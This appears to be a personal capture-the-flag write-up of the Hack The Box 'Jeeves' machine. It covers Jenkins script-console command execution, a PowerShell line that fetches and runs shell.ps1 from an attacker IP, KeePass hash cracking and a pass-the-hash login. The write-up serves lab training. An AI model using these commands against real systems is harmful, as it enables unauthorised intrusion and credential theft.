---
tags: [HTB]
title: Jeeves
created: '2020-09-02T14:42:00.213Z'
modified: '2020-09-03T02:23:58.781Z'
---

# Jeeves
- on port 80 there is a search engine thing, that with something typed shows an error.html page.
- inspecting the source code of everything, anything typed into the box will error out and it turns out the error page is just an image
- now for looking at the gobuster output it does not show anything from autorecon, however re running with the dir medium on the port 50000 dir we find a /askjeeves page which is a jenkin's admin panel
- looking at the panel, we see we have anonymous jenkins access already so we can just go to the script console to execute Grooby script and execute commands on the machine
- we could create a project but that is more noisy
```groovy
cmd = whoami
println cmd.execute().text

cmd = "powershell -c \"iex(new-object system.net.webclient).downloadstring('http://10.10.14.11/shell.ps1')\""
println cmd.execute().text
```

- once we get a shell, in the user's documents folder, there is a keypass database file, which we can use keypass2john to crack the password
- we get the password moonshine1
- use keepass2 to login to the database file
- inside of the db, there are credentials for people, however they do not work, but, there is a ntlm hash in the backups entry
- using pth-winexec we can login to administrator
  - pth-winexec -U \<user\>%\<ntlm\> //\<ip\> \<shellname_usually_cmd\>

- once we are administrator, we then can look for the root.txt however it is shown that the hm.txt file contents tells us to look deeper
- using dir /R we can see the ADS's of the hm.txt, which contains root.txt
- using powershell get-content, we can get the hash

